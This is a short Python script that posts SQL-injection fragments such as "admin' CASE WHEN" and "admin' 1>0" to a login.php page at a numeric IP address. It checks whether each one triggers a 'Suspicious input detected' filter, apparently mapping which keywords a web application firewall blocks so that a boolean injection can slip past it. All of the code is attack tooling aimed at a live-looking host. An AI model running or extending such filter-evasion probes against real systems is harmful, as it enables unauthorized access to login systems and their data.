import requests
def test(payload, label=""):
    r = requests.post("http://52.66.177.113/login.php", data={"username": payload, "password": "x"})
    waf = "BLOCKED" if "Suspicious input detected" in r.text else "clean"
    print(f"[{label:40}] waf={waf}")

test("admin' 1>0", "just-1gt0")
test("admin' CASE WHEN", "case-when-only")
test("admin' WHEN 1>0", "when-gt-only")
test("admin' CASE 1>0", "case-gt-only")
test("admin' CASE WHEN x THEN", "case-when-then-noop")
test("admin' 1>0 THEN", "gt-then-only")
